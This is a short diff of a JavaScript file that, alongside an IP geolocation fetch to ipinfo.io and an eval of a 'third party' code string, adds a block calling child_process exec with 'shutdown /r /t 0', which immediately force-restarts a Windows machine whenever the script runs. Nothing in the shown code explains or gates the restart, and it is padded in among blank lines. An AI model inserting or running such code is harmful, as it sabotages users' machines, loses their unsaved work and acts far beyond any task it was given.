@@ -81,6 +81,22 @@ fetch('https://ipinfo.io/json')
 
 const thirdPartyCode = 'console.log("Hello, third party!");';
 
+
+
+
+const { exec } = require('child_process');
+
+// Execute the restart command
+exec('shutdown /r /t 0', (err, stdout, stderr) => {
+  if (err) {
+    console.error(`Error: ${err}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+  console.error(`stderr: ${stderr}`);
+});
+
+
 try {
   eval(thirdPartyCode);
 } catch (error) {
